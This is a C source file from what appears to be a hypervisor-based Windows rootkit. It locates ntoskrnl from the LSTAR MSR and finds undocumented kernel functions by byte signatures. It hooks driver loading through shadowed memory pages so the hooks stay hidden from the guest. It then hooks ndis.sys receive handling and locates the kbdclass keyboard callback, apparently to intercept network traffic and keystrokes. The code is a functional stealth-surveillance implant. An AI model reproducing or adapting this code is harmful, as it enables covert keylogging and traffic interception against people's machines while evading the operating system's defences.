#include <hooks/ntoskrnl.h>
#include <vmm/vmm.h>
#include <hooks/hooking.h>
#include <lib/instr.h>
#include <lib/util.h>
#include <hooks/pe.h>

__attribute__((section(".vmm"))) byte_t* locate_ntoskrnl(uint64_t lstar){
    byte_t* base = ALIGN_DOWN(lstar, PAGE_SIZE);
    while (!check_for_module(base, "ntkrnlmp.pdb", 13)) base -= PAGE_SIZE;
    return base;
}

__attribute__((section(".vmm"))) uint64_t locate_PsLoadedModuleList(uint64_t ntoskrnl){

    byte_t sign[] = {
        0x8b, 0x78, 0x28,   // mov rdi, [rax+28h]
        0x4c, 0x8b, 0xe2,   // mov r12, rdx
        0x4c, 0x89, 0x06,   // mov [rsi], r8
        0x4c, 0x8b, 0xe9    // mov r13, rcx
    };

    uint64_t MiObtainSectionForDriver_lea = find_signature(ntoskrnl, sign, 12)+12;

    return MiObtainSectionForDriver_lea+7+*(dword_t*)guest_virtual_to_physical(MiObtainSectionForDriver_lea+3);

}

__attribute__((section(".vmm"))) uint64_t locate_MiDriverLoadSucceeded(uint64_t ntoskrnl){
    byte_t sign[] = {
        0x48, 0x8b, 0x08,               // mov rcx, qword ptr [rax]
        0xc6, 0x45, 0xc8, 0x03,         // mov byte ptr [rbp-38h], 3
        0x8b, 0x45, 0xc8,               // mov eax, dword ptr [rbp-38h]
        0x25, 0xff, 0x0f, 0xf8, 0xff    // and eax, 0FFF80FFFh
    };

    uint64_t MiDriverLoadSucceded = find_signature(ntoskrnl, sign, 15) - 0x49;

    return MiDriverLoadSucceded;
}

__attribute__((section(".vmm"))) void handle_lstar_write(uint64_t lstar){

    shared_cores_data.ntoskrnl = locate_ntoskrnl(lstar);

    LOG_INFO("Found ntoskrnl: %x\n", shared_cores_data.ntoskrnl);

    shared_cores_data.PsLoadedModuleList = locate_PsLoadedModuleList(shared_cores_data.ntoskrnl);

    shared_cores_data.functions.MiDriverLoadSucceeded = locate_MiDriverLoadSucceeded(shared_cores_data.ntoskrnl);
    uint64_t MiDriverLoadSucceeded_phys = guest_virtual_to_physical(shared_cores_data.functions.MiDriverLoadSucceeded);
    
    hook_function(MiDriverLoadSucceeded_phys, &shared_cores_data.memory_shadowing_pages.MiDriverLoadSucceeded_x, shared_cores_data.memory_shadowing_pages.MiDriverLoadSucceeded_rw);

    clear_msr_bitmap_write(LSTAR_MSR, shared_cores_data.msr_bitmaps);

}

__attribute__((section(".vmm"))) void handle_MiDriverLoadSucceeded_hook(vmexit_data_t *state){

    // Emulate PUSH RBP
    __vmwrite(GUEST_RSP, __vmread(GUEST_RSP)-8);
    uint64_t guest_stack = __vmread(GUEST_RSP);
    uint64_t guest_stack_phys = guest_virtual_to_physical(guest_stack);
    *(uint64_t*)guest_stack_phys = state->registers->rbp;

    // Find ndis
    if (shared_cores_data.ndis == 0){
        shared_cores_data.ndis = find_windows_module(u"ndis.sys", 16);
        if (shared_cores_data.ndis != 0){
            LOG_INFO("Found ndis.sys: %x\n", shared_cores_data.ndis);

            shared_cores_data.functions.ndisMSendNBLToMiniportInternal = locate_ndisMSendNBLToMiniportInternal(shared_cores_data.ndis);
            shared_cores_data.functions.NdisMIndicateReceiveNetBufferLists = locate_NdisMIndicateReceiveNetBufferLists(shared_cores_data.ndis);
            hook_function(guest_virtual_to_physical(shared_cores_data.functions.NdisMIndicateReceiveNetBufferLists),
             &shared_cores_data.memory_shadowing_pages.NdisMIndicateReceiveNetBufferLists_x,
              shared_cores_data.memory_shadowing_pages.NdisMIndicateReceiveNetBufferLists_rw);
        }
    }

    // Find kbdclass

    uint64_t head = get_previous_node(shared_cores_data.PsLoadedModuleList);
    if (get_node_dllname_length(head) == sizeof(u"kbdclass.sys")-2 && memcmp(get_node_dllname_buffer(head), u"kbdclass.sys", sizeof(u"kbdclass.sys")-2)){
        shared_cores_data.kbdclass = get_node_dllbase(head);
        LOG_INFO("Found kbdclass.sys: %x\n", shared_cores_data.kbdclass);
        shared_cores_data.functions.KeyboardClassServiceCallback = locate_KeyboardClassServiceCallback(shared_cores_data.kbdclass);
    }

    // Remove the MiDriverLoadSucceeded hook if all drivers were found
    if (shared_cores_data.kbdclass != 0 && shared_cores_data.ndis != 0){
        LOG_DEBUG("Removing MiDriverLoadSucceeded hook\n");
        uint64_t MiDriverLoadSucceeded_phys = guest_virtual_to_physical(__vmread(GUEST_RIP));
        *(uint8_t*)MiDriverLoadSucceeded_phys = PUSH_RBP;
    }

}
